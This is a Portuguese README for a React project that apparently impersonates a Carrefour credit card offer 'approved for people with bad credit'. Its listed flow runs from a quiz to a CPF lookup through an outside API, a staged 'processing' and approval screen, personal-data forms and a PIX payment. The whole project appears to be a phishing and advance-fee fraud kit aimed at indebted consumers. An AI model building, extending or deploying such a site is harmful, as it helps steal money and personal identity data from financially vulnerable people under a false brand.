# 🛒 Cartão Carrefour - Aprovado para Negativados

Sistema completo de solicitação de cartão de crédito Carrefour, otimizado para pessoas com restrições no CPF.

## 🚀 Como Executar

### 1. Instalar dependências

```bash
npm install
```

### 2. Executar em desenvolvimento

```bash
npm run dev
```

O projeto estará disponível em `http://localhost:5173`

### 3. Build para produção

```bash
npm run build
```

## 📁 Estrutura do Projeto

```
src/
├── components/        # Componentes React
│   ├── Landing/      # Página inicial
│   ├── Quiz/         # Questionário
│   ├── CPFConsult/   # Consulta de CPF
│   ├── Processing/   # Processamento/Analise
│   ├── Approval/     # Tela de aprovação
│   ├── Benefits/     # Benefícios do cartão
│   ├── Customization/# Personalização
│   ├── Forms/        # Formulários de dados
│   ├── Payment/      # Pagamento PIX
│   ├── VirtualCard/  # Cartão virtual
│   ├── Confirmation/ # Confirmação final
│   └── Shared/       # Componentes compartilhados
├── services/         # APIs e serviços
│   ├── api.js        # Consulta CPF/CEP
│   └── pix.js        # Integração PIX
├── store/            # Estado global (Zustand)
│   └── userStore.js
└── styles/           # Estilos globais
    └── index.css
```

## 🔧 Configuração

### Variáveis de Ambiente

Crie um arquivo `.env` na raiz do projeto (opcional, já está configurado):

```env
VITE_CPF_API_URL=https://tsmbotzygympsfxvjeul.supabase.co
VITE_CPF_API_KEY=sua_chave_aqui
```

### Integração PIX

Edite `src/services/pix.js` e adicione sua integração do gateway PIX:

```javascript
export const gerarPIX = async (dados) => {
  // Substitua pela sua integração real
  const response = await fetch('SEU_ENDPOINT_PIX', {
    method: 'POST',
    headers: {
      'Authorization': 'Bearer SEU_TOKEN',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(dados)
  });
  return await response.json();
};
```

## 🎨 Design System

- **Cores:** Carrefour Blue (#0066CC) e Orange (#FF6600)
- **Tipografia:** Inter (Google Fonts)
- **Componentes:** TailwindCSS + componentes customizados
- **Animações:** Framer Motion

## 📱 Funcionalidades

✅ Landing page responsiva
✅ Questionário interativo
✅ Consulta de CPF via API
✅ Processamento com animações
✅ Tela de aprovação
✅ Lista de benefícios
✅ Personalização de cartão
✅ Formulários multi-step
✅ Geração de PIX
✅ Visualização de cartão virtual
✅ Confirmação final

## 🔐 Segurança

- Validação de dados no frontend
- Integração segura com APIs
- Dados sensíveis não armazenados localmente
- HTTPS obrigatório em produção

## 📄 Licença

Este projeto é privado e confidencial.

## 👨‍💻 Desenvolvimento

Desenvolvido com React + Vite + TailwindCSS + Framer Motion


